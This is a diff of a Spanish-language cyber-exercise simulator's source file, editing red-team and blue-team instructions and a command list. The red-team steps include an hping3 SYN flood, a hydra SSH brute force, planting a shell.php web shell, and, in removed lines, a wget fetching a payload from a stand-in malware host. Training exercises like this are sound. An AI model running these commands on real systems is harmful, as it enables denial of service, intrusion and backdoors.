+    <strong class="text-amber-300">sudo ufw deny from 192.168.1.100</strong> (Bloquea la IP atacante).
+    Esto detendrá AMBOS ataques simultáneamente.
 
 3.  <strong>Análisis Post-Incidente:</strong> ¿Lograron entrar?
-    <strong class="text-amber-300">sha256sum /var/www/html/index.php</strong> (Verifica la integridad del archivo.
-                                        Si el Equipo Rojo tuvo éxito, verás una alerta
-                                        de que el hash no coincide).
+    <strong class="text-amber-300">who</strong> o <strong class="text-amber-300">w</strong> (Revisa usuarios conectados).
+    <strong class="text-amber-300">sha256sum /var/www/html/index.php</strong> (Verifica integridad del archivo).
 </pre>`,
     red: `<pre class="whitespace-pre-wrap font-mono text-xs">
 <strong class="text-red-400">EQUIPO ROJO (ATACANTE) - EN TERMINAL 'soc-valtorix'</strong>
 Tu misión es multifacética: distraer, infiltrar y desplegar.
 
 1.  <strong>Fase de Distracción (DoS):</strong> Crea caos.
-    <strong class="text-amber-300">hping3 --flood -S PORTAL-WEB</strong> (Lanza un SYN flood. Esto hará que el servidor
-                                   se vuelva lento y alertará al Equipo Azul,
-                                   dándote cobertura para el siguiente paso).
+    <strong class="text-amber-300">hping3 --flood -S -p 80 PORTAL-WEB</strong> (Satura el servidor. CPU al 100%).
 
 2.  <strong>Fase de Infiltración (Fuerza Bruta):</strong>
-    Mientras el DoS está activo, abre otra ventana (mentalmente) y lanza:
+    Mientras el DoS corre (es una distracción), lanza el ataque real:
     <strong class="text-amber-300">hydra -l admin -P wordlist.txt ssh://PORTAL-WEB</strong>
-    (Este ataque encontrará la contraseña. Si el Equipo Azul te bloquea
-    la IP, ambos ataques fallarán).
 
-3.  <strong>Acceso y "Payload":</strong>
-    Si obtuviste la contraseña antes de ser bloqueado:
-    <strong class="text-amber-300">ssh admin@PORTAL-WEB</strong> (Usa la contraseña encontrada).
-    Una vez dentro, simula el despliegue de un payload:
-    <strong class="text-amber-300">wget http://malware-repo.bad/payload.sh</strong>
-
-El ejercicio termina cuando el Equipo Azul bloquea tu IP o cuando despliegas el payload.
+3.  <strong>Acceso y Persistencia:</strong>
+    Si obtienes la contraseña antes del bloqueo:
+    <strong class="text-amber-300">ssh admin@PORTAL-WEB</strong>
+    Instala backdoor: <strong class="text-amber-300">cat > /var/www/html/shell.php</strong>
 </pre>`
  }
 };
@@ -915,5 +894,5 @@ export const ALL_COMMANDS = [
     'help', 'nmap', 'hydra', 'nc', 'msfconsole', 'clear', 'marca', 'exit', 
     'ssh', 'sudo', 'ufw', 'ls', 'whoami', 'ping', 'dirb', 'curl', 'nikto',
     'john', 'wget', 'cat', 'ps', 'systemctl', 'chmod', 'nano', 'grep', 'top', 'htop', 'ss',
-    'journalctl', 'openssl', 'fail2ban-client', 'sha256sum', 'hping3'
+    'journalctl', 'openssl', 'fail2ban-client', 'sha256sum', 'hping3', 'tail', 'netstat'
 ];
